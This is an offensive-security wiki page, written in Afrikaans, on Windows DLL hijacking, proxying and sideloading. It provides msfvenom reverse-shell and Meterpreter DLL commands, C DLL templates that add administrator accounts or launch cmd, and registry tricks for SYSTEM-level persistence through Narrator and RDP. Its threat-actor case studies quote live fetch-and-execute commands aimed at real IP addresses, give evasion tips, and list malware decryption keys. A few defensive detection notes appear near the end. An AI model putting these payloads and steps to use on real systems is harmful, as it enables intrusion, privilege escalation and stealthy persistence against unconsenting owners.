Basies is 'n **DLL proxy** 'n DLL wat **jou kwaadwillige kode kan uitvoer wanneer dit gelaai word**, maar ook **die funksies van die regte biblioteek kan blootstel** en soos **verwag** kan **werk deur al die oproepe na die regte biblioteek aan te stuur**.

Met die nutsmiddel [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy 'n **uitvoerbare lêer aandui en die biblioteek kies** wat jy wil proxify, en 'n **geproxifiseerde DLL genereer**; of die **DLL aandui** en 'n **geproxifiseerde DLL genereer**.

### **Meterpreter**

**Kry 'n rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Kry 'n meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Skep 'n gebruiker (x86; ek het nie 'n x64-weergawe gesien nie):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Jou eie

In baie gevalle moet die DLL wat jy compile **elke funksie export wat die slagofferproses importeer**. As ’n vereiste export ontbreek, kan die binary dit nie resolve nie en misluk die exploit.

<details>
<summary>C DLL-template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>C++ DLL-voorbeeld met gebruikerskepping</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternatiewe C DLL met thread entry</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Gevallestudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe ondersoek steeds met die opstart ’n voorspelbare, taalspesifieke lokalisering-DLL wat gekaap kan word vir arbitrêre kode-uitvoering en persistence.<sup>[[7]](#references)</sup>

Sleutelfeite
- Ondersoekpad (huidige builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Verouderde pad (ouer builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- As daar ’n skryfbare DLL onder die aanvaller se beheer by die OneCore-pad bestaan, word dit gelaai en `DllMain(DLL_PROCESS_ATTACH)` word uitgevoer. Geen exports word vereis nie.

Ontdekking met Procmon
- Filter: `Process Name is Narrator.exe` en `Operation is Load Image` of `CreateFile`.
- Begin Narrator en let op die poging om die bogenoemde pad te laai.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC stilte
- ’n Naïewe hijack sal die UI laat praat/verlig. Om stil te bly, lys Narrator-threads tydens attach, maak die hoofthread oop (`OpenThread(THREAD_SUSPEND_RESUME)`) en suspendeer dit met `SuspendThread`; gaan voort in jou eie thread. Sien PoC vir volledige kode.<sup>[[8]](#references)</sup>

Trigger en persistence via Accessibility-konfigurasie
- Gebruikerkonteks (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met bogenoemde laai die aanvang van Narrator die geplante DLL. Druk op die secure desktop (aanmeldskerm) CTRL+WIN+ENTER om Narrator te begin; jou DLL word as SYSTEM op die secure desktop uitgevoer.

RDP-geaktiveerde SYSTEM-uitvoering (laterale beweging)
- Laat die klassieke RDP-sekuriteitslaag toe: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Koppel via RDP aan die gasheer en druk CTRL+WIN+ENTER by die aanmeldskerm om Narrator te begin; jou DLL word as SYSTEM op die secure desktop uitgevoer.
- Uitvoering stop wanneer die RDP-sessie sluit—inject/migrate dadelik.

Bring Your Own Accessibility (BYOA)
- Jy kan ’n ingeboude Accessibility Tool (AT)-registerinskrywing (bv. CursorIndicator) kloon, dit wysig om na ’n arbitrêre binary/DLL te verwys, dit invoer en dan `configuration` op daardie AT-naam stel. Dit proxy arbitrêre uitvoering onder die Accessibility-raamwerk.

Notas
- Skryfregte onder `%windir%\System32` en die verandering van HKLM-waardes vereis admin-regte.
- Al die payload-logika kan in `DLL_PROCESS_ATTACH` wees; exports is nie nodig nie.

## Gevallestudie: CVE-2025-1729 - Privilege Escalation met TPQMAssistant.exe

Hierdie geval demonstreer **Phantom DLL Hijacking** in Lenovo se TrackPoint Quick Menu (`TPQMAssistant.exe`), wat as **CVE-2025-1729** opgespoor word.<sup>[[2]](#references)[[3]](#references)</sup>

### Besonderhede oor die kwesbaarheid

- **Komponent**: `TPQMAssistant.exe`, geleë by `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` loop daagliks om 9:30 AM in die konteks van die aangemelde gebruiker.
- **Gidsregte**: Skryfbaar deur `CREATOR OWNER`, wat plaaslike gebruikers toelaat om arbitrêre lêers daar te plaas.
- **DLL-soekgedrag**: Probeer eers om `hostfxr.dll` uit sy werkgids te laai en teken "NAME NOT FOUND" aan as dit ontbreek, wat aandui dat die plaaslike gids soekvoorrang het.

### Implementering van die exploit

’n Aanvaller kan ’n kwaadwillige `hostfxr.dll`-stub in dieselfde gids plaas en die ontbrekende DLL uitbuit om kode in die gebruiker se konteks uit te voer:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Aanvalsvloei

1. Drop as standaardgebruiker `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag totdat die geskeduleerde taak om 9:30 AM in die huidige gebruiker se konteks loop.
3. As ’n administrateur aangemeld is wanneer die taak loop, word die kwaadwillige DLL in die administrateur se sessie met medium-integriteit uitgevoer.
4. Gebruik standaard UAC-bypass-tegnieke in ’n ketting om van medium-integriteit na SYSTEM-regte te verhoog.

## Gevallestudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Bedreigingsakteurs kombineer dikwels MSI-gebaseerde droppers met DLL side-loading om payloads onder ’n vertroude, ondertekende proses uit te voer.<sup>[[10]](#references)</sup>

Kettingoorsig
- Die gebruiker laai ’n MSI af. ’n CustomAction loop stilweg tydens die GUI-installasie (bv. LaunchApplication of ’n VBScript-aksie) en rekonstrueer die volgende stadium vanuit ingebedde hulpbronne.
- Die dropper skryf ’n wettige, ondertekende EXE en ’n kwaadwillige DLL na dieselfde gids (voorbeeldpaar: Avast-ondertekende wsc_proxy.exe + aanvallerbeheerde wsc.dll).
- Wanneer die ondertekende EXE begin word, laai Windows se DLL-soekvolgorde eerste wsc.dll vanaf die werkgids, wat aanvallerkode onder ’n ondertekende ouerproses uitvoer (ATT&CK T1574.001).

MSI-ontleding (waarna om te kyk)
- CustomAction-tabel:
  - Soek inskrywings wat uitvoerbare lêers of VBScript laat loop. Voorbeeld van ’n verdagte patroon: LaunchApplication wat ’n ingebedde lêer in die agtergrond uitvoer.
  - Inspekteer in Orca (Microsoft Orca.exe) die CustomAction-, InstallExecuteSequence- en Binary-tabelle.
- Ingebedde/verdeelde payloads in die MSI CAB:
  - Administratiewe onttrekking: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Of gebruik lessmsi: lessmsi x package.msi C:\out
  - Soek verskeie klein fragmente wat deur ’n VBScript CustomAction saamgevoeg en gedekripteer word. Algemene vloei:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktiese sideloading met wsc_proxy.exe
- Plaas hierdie twee lêers in dieselfde gids:
  - wsc_proxy.exe: wettige, ondertekende host (Avast). Die proses probeer om wsc.dll volgens naam uit sy gids te laai.
  - wsc.dll: aanvaller-DLL. As geen spesifieke exports vereis word nie, kan DllMain voldoende wees; andersins, bou ’n proxy-DLL en stuur vereiste exports aan die egte biblioteek deur terwyl die payload in DllMain uitgevoer word.
- Bou ’n minimale DLL-payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Vir export-vereistes, gebruik ’n proxying framework (bv. DLLirant/Spartacus) om ’n forwarding DLL te genereer wat ook jou payload uitvoer.

- Hierdie tegniek berus op DLL-naammaatstelling deur die host-binary. As die host absolute paths of veilige laaivlae gebruik (bv. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kan die hijack misluk.
- KnownDLLs, SxS en forwarded exports kan voorrang beïnvloed en moet in ag geneem word wanneer die host-binary en export-set gekies word.

## Ondertekende triades + geënkripteerde payloads (ShadowPad-gevallestudie)

Check Point het beskryf hoe Ink Dragon ShadowPad ontplooi deur ’n **drie-lêer-triade** te gebruik om by wettige sagteware in te meng, terwyl die kern-payload op skyf geënkripteer bly:<sup>[[12]](#references)</sup>

1. **Ondertekende host EXE** – verskaffers soos AMD, Realtek of NVIDIA word misbruik (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die aanvallers hernoem die executable sodat dit soos ’n Windows-binary lyk (byvoorbeeld `conhost.exe`), maar die Authenticode-handtekening bly geldig.
2. **Kwaadwillige loader DLL** – word langs die EXE afgelaai met ’n verwagte naam (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL is gewoonlik ’n MFC-binary wat met die ScatterBrain-framework verduister is; sy enigste taak is om die geënkripteerde blob op te spoor, dit te dekripteer en ShadowPad reflektief te map.
3. **Geënkripteerde payload-blob** – word dikwels as `<name>.tmp` in dieselfde gids gestoor. Nadat die gedekripteerde payload in geheue gemap is, verwyder die loader die TMP-lêer om forensiese bewyse te vernietig.

Tradecraft-notas:

* Deur die ondertekende EXE te hernoem (terwyl die oorspronklike `OriginalFileName` in die PE-header behoue bly), kan dit hom as ’n Windows-binary voordoen en tog die verskaffer se handtekening behou. Herhaal dus Ink Dragon se gewoonte om binaries wat soos `conhost.exe` lyk, maar eintlik AMD/NVIDIA-utilities is, neer te sit.
* Omdat die executable vertrou bly, hoef die meeste allowlisting-kontroles net toe te laat dat jou kwaadwillige DLL langsaan staan. Fokus op die aanpassing van die loader-DLL; die ondertekende ouerproses kan gewoonlik onveranderd loop.
* ShadowPad se decryptor verwag dat die TMP-blob langs die loader staan en skryfbaar is, sodat dit die lêer kan nulmaak nadat dit gemap is. Hou die gids skryfbaar totdat die payload laai; sodra dit in geheue is, kan die TMP-lêer veilig vir OPSEC verwyder word.

### LOLBAS-stager + staged-archive-sideloading-ketting (Finger → tar/curl → WMI)

Operateurs kombineer DLL sideloading met LOLBAS sodat die enigste pasgemaakte artefak op skyf die kwaadwillige DLL langs die vertroude EXE is:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Versteekte PowerShell begin `cmd.exe /c`, haal opdragte van ’n Finger-bediener af en stuur dit deur na `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` haal teks oor TCP/79 op; `| cmd` voer die bediener se antwoord uit, sodat operateurs die second stage aan die bedienerkant kan vervang.

- **Ingeboude aflaai/uitpak:** Laai ’n argief met ’n onskadelike uitbreiding af, pak dit uit en plaas die sideload-teiken plus DLL onder ’n ewekansige `%LocalAppData%`-lêergids:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` verberg vordering en volg herleidings; `tar -xf` gebruik Windows se ingeboude tar.

- **WMI/CIM-bekendstelling:** Begin die EXE via WMI sodat telemetrie ’n CIM-geskepte proses wys terwyl dit die DLL in dieselfde gids laai:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Werk met binaries wat plaaslike DLLs verkies (bv. `intelbq.exe`, `nearby_share.exe`); payload (bv. Remcos) loop onder die vertroude naam.

- **Opsporing:** Stel ’n waarskuwing in vir `forfiles` wanneer `/p`, `/m` en `/c` saam voorkom; dit is ongewoon buite admin-skripte.


## Gevallestudie: NSIS-dropper + Bitdefender Submission Wizard-sideload (Chrysalis)

’n Onlangse Lotus Blossom-inbraak het ’n vertroude opdateringsketting misbruik om ’n NSIS-gepakte dropper af te lewer wat ’n DLL-sideload plus payloads wat volledig in geheue loop, voorberei het.<sup>[[13]](#references)</sup>

Handelsvloeiproses
- `update.exe` (NSIS) skep `%AppData%\Bluetooth`, merk dit as **HIDDEN**, plaas ’n hernoemde Bitdefender Submission Wizard `BluetoothService.exe`, ’n kwaadwillige `log.dll` en ’n geënkripteerde blob `BluetoothService`, en begin dan die EXE.
- Die gasheer-EXE voer `log.dll` in en roep `LogInit`/`LogWrite` aan. `LogInit` laai die blob met mmap; `LogWrite` dekripteer dit met ’n pasgemaakte LCG-gebaseerde stroom (konstantes **0x19660D** / **0x3C6EF35F**, sleutelmateriaal afgelei van ’n vorige hash), oorskryf die buffer met gewone teks-shellcode, maak tydelike data vry en spring daarna daarheen.
- Om ’n IAT te vermy, bepaal die loader API’s deur uitvoernaam-hashes met **FNV-1a-basis 0x811C9DC5 + priemgetal 0x1000193** te hash en pas dan ’n Murmur-agtige lawine (**0x85EBCA6B**) toe, waarna dit met gesoute teiken-hashes vergelyk.

Hoof-shellcode (Chrysalis)
- Dekripteer ’n PE-agtige hoofmodule deur add/XOR/sub met die sleutel `gQ2JR&9;` oor vyf passe te herhaal, en laai dan `Kernel32.dll` → `GetProcAddress` dinamies om die invoeroplossing te voltooi.
- Rekonstrueer DLL-naamstringe tydens looptyd deur bit-rotasie/XOR-transformasies per karakter toe te pas, en laai dan `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Gebruik ’n tweede resolver wat deur die **PEB → InMemoryOrderModuleList** loop, elke uitvoertabel in 4-greep-blokke ontleed met Murmur-agtige vermenging, en slegs na `GetProcAddress` terugval as die hash nie gevind word nie.

Ingebedde konfigurasie & C2
- Die konfigurasie is in die afgelaaide `BluetoothService`-lêer by **offset 0x30808** (grootte **0x980**) en word met die RC4-sleutel `qwhvb^435h&*7` gedekripteer, wat die C2-URL en User-Agent onthul.
- Beacons bou ’n gasheerprofiel met punte as skeidingstekens, voeg die merker `4Q` vooraan, en enkripteer dit dan met RC4-sleutel `vAuig34%^325hGV` voordat dit via HTTPS met `HttpSendRequestA` gestuur word. Antwoorde word met RC4 gedekripteer en deur ’n merkerskakelaar verwerk (`4T` shell, `4V` prosesuitvoering, `4W/4X` lêerskryf, `4Y` lees/eksfiltrasie, `4\\` deïnstallering, `4` aandrywer-/lêer-enumerasie + gevalle van stukgewyse oordrag).
- Die uitvoermodus word deur CLI-argumente beheer: geen argumente = installeer volharding (diens/Run-sleutel) wat na `-i` wys; `-i` begin self weer met `-k`; `-k` slaan installasie oor en voer payload uit.

Waargenome alternatiewe loader
- Dieselfde inbraak het Tiny C Compiler afgelaai en `svchost.exe -nostdlib -run conf.c` vanaf `C:\ProgramData\USOShared\` uitgevoer, met `libtcc.dll` daar langsaan. Die aanvaller-verskafde C-bronkode het shellcode ingebed, dit saamgestel en in geheue uitgevoer sonder om ’n PE na die skyf te skryf. Reproduseer met:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Hierdie TCC-gebaseerde compile-and-run-stadium het `Wininet.dll` tydens looptyd ingevoer en ’n tweede-stadium-shellcode van ’n hardgekodeerde URL afgelaai, wat ’n buigsame loader opgelewer het wat hom as ’n compiler-run voordoen.

## Signed-host sideloading with export proxying + host thread parking

Sommige DLL-sideloading-kettings sluit **stabiliteitsingenieurswerk** in sodat die wettige host lank genoeg aan die gang bly om latere stadiums netjies te laai, eerder as om te crash nadat die kwaadwillige DLL gelaai is.<sup>[[11]](#references)</sup>

Waargenome patroon
- Plaas ’n vertroude EXE langs ’n kwaadwillige DLL met die verwagte afhanklikheidsnaam, soos `version.dll`.
- Die kwaadwillige DLL **proxy elke verwagte export** terug na die werklike stelsel-DLL (byvoorbeeld `%SystemRoot%\\System32\\version.dll`) sodat invoerresolusie steeds slaag en die host-proses aanhou werk.
- Nadat dit gelaai is, **patch die kwaadwillige DLL die host se toegangspunt** sodat die hooftoetraad in ’n oneindige `Sleep`-lus beland, eerder as om te eindig of kodepaaie uit te voer wat die proses sou beëindig.
- ’n Nuwe thread voer die werklike kwaadwillige werk uit: dit dekripteer die volgende-stadium-DLL se naam of pad (RC4/XOR is algemeen) en begin dit dan met `LoadLibrary`.

Waarom dit saak maak
- Gewone DLL-proxying behou API-versoenbaarheid, maar waarborg nie dat die host lank genoeg aan die gang bly vir latere stadiums nie.
- Om die hooftoetraad in `Sleep(INFINITE)` te laat wag, is ’n eenvoudige manier om die getekende proses inwonend te hou terwyl die loader dekripsie, staging of netwerk-opstartwerk in ’n worker thread uitvoer.
- As daar net na ’n verdagte `DllMain` gesoek word, kan hierdie patroon gemis word wanneer die interessante gedrag eers plaasvind nadat die host se toegangspunt gepatch is en ’n sekondêre thread begin.

Minimale werkvloei
1. Kopieer die getekende host-EXE en bepaal watter DLL dit uit die plaaslike gids laai.
2. Bou ’n proxy-DLL wat dieselfde funksies exporteer en dit na die wettige DLL aanstuur.
3. Skep in `DllMain(DLL_PROCESS_ATTACH)` ’n worker thread.
4. Patch vanuit daardie thread die host se toegangspunt of die hooftoetraad se beginroetine sodat dit in ’n `Sleep`-lus beland.
5. Dekripteer die volgende-stadium-DLL se naam/konfigurasie en roep `LoadLibrary` aan, of map die payload handmatig.

Verdedigingswenkpunte
- Getekende prosesse wat `version.dll` of soortgelyke algemene biblioteke uit hul eie toepassingsgids laai, eerder as uit `System32`.
- Geheue-patches by die prosestoegangspunt kort nadat die image gelaai is, veral spronge/aanroepe wat na `Sleep`/`SleepEx` herlei word.
- Threads wat deur ’n proxy-DLL geskep word en onmiddellik `LoadLibrary` op ’n tweede DLL met ’n gedekripteerde naam aanroep.
- Volledige export-proxy-DLL’s wat langs verskaffer-uitvoerbare lêers in skryfbare staging-gidse geplaas word, soos `ProgramData`, `%TEMP%` of uitgepakte argiefpaaie.

## References

- [1] [Red Canary – Intelligensie-insigte: Januarie 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Voorregte-eskalasie met TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL-hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL-hijacking in Windows. Eenvoudige C-voorbeeld.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore ontplooi nuwe malware wat Europa teiken](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Wanneer DLL-hijacks Windows Helpers ontmoet](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digitale dubbelgangers: Ontleding van ontwikkelende nabootsingsveldtogte wat Gh0st RAT versprei](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Belange wat saamvloei: Ontleding van bedreigingsgroepe wat ’n Suidoos-Asiatiese regering teiken](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Binne Ink Dragon: Onthulling van die aflosnetwerk en innerlike werking van ’n geheimsinnige offensiewe operasie](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Die Chrysalis-agterdeur: ’n Diepgaande blik op Lotus Blossom se gereedskapstel](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL-hijack-ketting](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Naspeuring van Iranian APT Screening Serpens se 2026-spioenasieveldtogte](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Vinnig en woedend: Nimbus Manticore-operasies tydens die Iranse konflik](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Taakaksies](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 teiken Suidoos-Asiatiese regerings en kritieke infrastruktuur](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Microsoft Learn – PE-formaat](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [27] [FortiGuard Labs – Ontbloting van ’n SectopRAT-variant ingebed in wettige sagteware](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
